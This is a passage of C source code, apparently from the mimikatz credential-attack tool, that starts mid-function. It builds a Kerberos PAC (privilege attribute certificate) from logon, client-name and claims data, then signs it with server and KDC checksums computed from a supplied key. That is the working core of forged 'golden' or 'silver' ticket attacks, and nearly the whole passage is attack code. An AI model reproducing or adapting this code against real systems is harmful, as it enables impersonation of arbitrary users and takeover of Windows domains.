                                             PVOID *encoded, DWORD *dwEncoded) {
  BOOL status = FALSE;
  CLAIMS_SET_METADATA metadata = {0, NULL, CLAIMS_COMPRESSION_FORMAT_NONE, 0, 0,
                                  0, NULL},
                      *pMetadata = &metadata;
  *encoded = NULL;
  *dwEncoded = 0;
  if (kull_m_rpc_EncodeClaimsSet(&claimsSet, (PVOID *)&metadata.ClaimsSet,
                                 &metadata.ulUncompressedClaimsSetSize)) {
    metadata.ulClaimsSetSize = metadata.ulUncompressedClaimsSetSize;
    status = kull_m_rpc_EncodeClaimsSetMetaData(&pMetadata, encoded, dwEncoded);
    LocalFree(metadata.ClaimsSet);
  }
  return status;
}

BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo,
                                      PFILETIME authtime, LPCWSTR clientname,
                                      LONG SignatureType,
                                      PCLAIMS_SET pClaimsSet, PPACTYPE *pacType,
                                      DWORD *pacLength) {
  BOOL status = FALSE;
  PVOID pLogonInfo = NULL, pClaims = NULL;
  PPAC_CLIENT_INFO pClientInfo = NULL;
  PAC_SIGNATURE_DATA signature = {SignatureType, {0}};
  DWORD n = 4, szLogonInfo = 0, szLogonInfoAligned = 0, szClientInfo = 0,
        szClientInfoAligned, szClaims = 0, szClaimsAligned = 0,
        szSignature = FIELD_OFFSET(PAC_SIGNATURE_DATA, Signature),
        szSignatureAligned,
        offsetData = sizeof(PACTYPE) + 3 * sizeof(PAC_INFO_BUFFER);
  PKERB_CHECKSUM pCheckSum;

  if (NT_SUCCESS(CDLocateCheckSum(SignatureType, &pCheckSum))) {
    szSignature += pCheckSum->CheckSumSize;
    szSignatureAligned = SIZE_ALIGN(szSignature, 8);

    if (kull_m_pac_EncodeValidationInformation(&validationInfo, &pLogonInfo,
                                               &szLogonInfo))
      szLogonInfoAligned = SIZE_ALIGN(szLogonInfo, 8);
    if (kuhl_m_pac_validationInfo_to_CNAME_TINFO(
            authtime ? authtime : &validationInfo->LogonTime,
            clientname ? clientname : validationInfo->EffectiveName.Buffer,
            &pClientInfo, &szClientInfo))
      szClientInfoAligned = SIZE_ALIGN(szClientInfo, 8);
    if (pClaimsSet)
      if (kuhl_m_kerberos_claims_encode_ClaimsSet(pClaimsSet, &pClaims,
                                                  &szClaims)) {
        szClaimsAligned = SIZE_ALIGN(szClaims, 8);
        n++;
        offsetData += sizeof(PAC_INFO_BUFFER);
      }

    if (pLogonInfo && pClientInfo) {
      *pacLength = offsetData + szLogonInfoAligned + szClientInfoAligned +
                   szClaimsAligned + 2 * szSignatureAligned;
      if (*pacType = (PPACTYPE)LocalAlloc(LPTR, *pacLength)) {
        (*pacType)->cBuffers = n;
        (*pacType)->Version = 0;

        (*pacType)->Buffers[0].cbBufferSize = szLogonInfo;
        (*pacType)->Buffers[0].ulType = PACINFO_TYPE_LOGON_INFO;
        (*pacType)->Buffers[0].Offset = offsetData;
        RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[0].Offset,
                      pLogonInfo, (*pacType)->Buffers[0].cbBufferSize);

        (*pacType)->Buffers[1].cbBufferSize = szClientInfo;
        (*pacType)->Buffers[1].ulType = PACINFO_TYPE_CNAME_TINFO;
        (*pacType)->Buffers[1].Offset =
            (*pacType)->Buffers[0].Offset + szLogonInfoAligned;
        RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[1].Offset,
                      pClientInfo, (*pacType)->Buffers[1].cbBufferSize);

        if (szClaimsAligned) {
          (*pacType)->Buffers[2].cbBufferSize = szClaims;
          (*pacType)->Buffers[2].ulType = PACINFO_TYPE_CLIENT_CLAIMS;
          (*pacType)->Buffers[2].Offset =
              (*pacType)->Buffers[1].Offset + szClientInfoAligned;
          RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[2].Offset,
                        pClaims, (*pacType)->Buffers[2].cbBufferSize);
        }

        (*pacType)->Buffers[n - 2].cbBufferSize = szSignature;
        (*pacType)->Buffers[n - 2].ulType = PACINFO_TYPE_CHECKSUM_SRV;
        (*pacType)->Buffers[n - 2].Offset =
            (*pacType)->Buffers[n - 3].Offset +
            SIZE_ALIGN((*pacType)->Buffers[n - 3].cbBufferSize, 8);
        RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[n - 2].Offset,
                      &signature, FIELD_OFFSET(PAC_SIGNATURE_DATA, Signature));

        (*pacType)->Buffers[n - 1].cbBufferSize = szSignature;
        (*pacType)->Buffers[n - 1].ulType = PACINFO_TYPE_CHECKSUM_KDC;
        (*pacType)->Buffers[n - 1].Offset =
            (*pacType)->Buffers[n - 2].Offset + szSignatureAligned;
        RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[n - 1].Offset,
                      &signature, FIELD_OFFSET(PAC_SIGNATURE_DATA, Signature));

        status = TRUE;
      }
    }

    if (pLogonInfo)
      LocalFree(pLogonInfo);
    if (pClientInfo)
      LocalFree(pClientInfo);
    if (pClaims)
      LocalFree(pClaims);
  }
  return status;
}

#define STATUS_NOT_FOUND 0xC0000225

NTSTATUS kuhl_m_pac_signature(PPACTYPE pacType, DWORD pacLenght,
                              LONG SignatureType, LPCVOID key, DWORD keySize) {
  NTSTATUS status;
  DWORD i;
  PKERB_CHECKSUM pCheckSum;
  PVOID Context;
  PPAC_SIGNATURE_DATA pSignatureData;
  PBYTE checksumSrv = NULL, checksumpKdc = NULL;

  status = CDLocateCheckSum(SignatureType, &pCheckSum);
  if (NT_SUCCESS(status)) {
    status = STATUS_NOT_FOUND;
    for (i = 0; i < pacType->cBuffers; i++) {
      if ((pacType->Buffers[i].ulType == PACINFO_TYPE_CHECKSUM_SRV) ||
          (pacType->Buffers[i].ulType == PACINFO_TYPE_CHECKSUM_KDC)) {
        pSignatureData =
            (PPAC_SIGNATURE_DATA)((PBYTE)pacType + pacType->Buffers[i].Offset);
        RtlZeroMemory(pSignatureData->Signature, pCheckSum->CheckSumSize);
        if (pacType->Buffers[i].ulType == PACINFO_TYPE_CHECKSUM_SRV)
          checksumSrv = pSignatureData->Signature;
        else
          checksumpKdc = pSignatureData->Signature;
      }
    }
    if (checksumSrv && checksumpKdc) {
      status = pCheckSum->InitializeEx(key, keySize, KERB_NON_KERB_CKSUM_SALT,
                                       &Context);
      if (NT_SUCCESS(status)) {
        pCheckSum->Sum(Context, pacLenght, pacType);
        pCheckSum->Finalize(Context, checksumSrv);
        pCheckSum->Finish(&Context);
        status = pCheckSum->InitializeEx(key, keySize, KERB_NON_KERB_CKSUM_SALT,
                                         &Context);
        if (NT_SUCCESS(status)) {
          pCheckSum->Sum(Context, pCheckSum->CheckSumSize, checksumSrv);
          pCheckSum->Finalize(Context, checksumpKdc);
          pCheckSum->Finish(&Context);
        }
      }
    }
  }
  return status;
}
